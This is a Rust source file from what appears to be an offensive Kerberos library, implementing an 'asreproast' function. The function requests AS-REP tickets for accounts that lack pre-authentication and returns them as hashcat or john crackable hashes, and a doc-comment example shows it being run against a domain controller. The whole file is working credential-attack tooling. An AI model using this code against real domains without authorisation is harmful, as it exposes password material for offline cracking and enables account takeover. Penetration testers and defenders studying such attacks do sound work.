use crate::{
	communication::KrbChannel,
	core::{
		request_as_rep, EncryptionType, KrbUser, {as_rep_to_crack_string, CrackFormat},
	},
	error::Result,
};

/// AS-REP Roasting can be used to discover users that do not require pre-authentication
///
/// This can be used to retrieve a ticket that can be cracked with hashcat or john
///
/// # Examples
///
/// ```
/// use cerbero_lib::{asreproast, CrackFormat, EncryptionType, KdcComm, Kdcs, TransportProtocol};
/// use std::net::{IpAddr, Ipv4Addr};
///
/// fn main()
/// {
///    let mut kdcs = Kdcs::new();
///    let kdc_ip = IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1));
///    kdcs.insert("DOMAIN.COM".to_string(), kdc_ip);
///
///    let mut kdccomm = KdcComm::new(kdcs, TransportProtocol::TCP);
///
///    match kdccomm.create_channel("DOMAIN.COM")
///    {
///       Ok(channel) => match asreproast(
///                                       "DOMAIN.COM",
///                                       "Username".to_string(),
///                                       CrackFormat::Hashcat,
///                                       channel.as_ref(),
///                                       Some(EncryptionType::RC4),
///       )
///       {
///          Ok(hash) =>
///          {
///             println!("Crackable hash: {}", hash);
///          },
///          Err(e) => panic!("Failed to AS-REP roast: {}", e),
///       },
///       Err(e) => panic!("Failed to create a channel to the KDC: {}", e),
///    }
/// }
/// ```
pub fn asreproast(realm: &str,
                  username: String,
                  crack_format: CrackFormat,
                  channel: &dyn KrbChannel,
                  etype: Option<EncryptionType>)
                  -> Result<String>
{
	let user = KrbUser::new(username.clone(), realm.to_string());

	let as_rep = request_as_rep(user, None, etype.map(|e| vec![e.as_constant()]), channel)?;

	Ok(as_rep_to_crack_string(&username, &as_rep, crack_format))
}
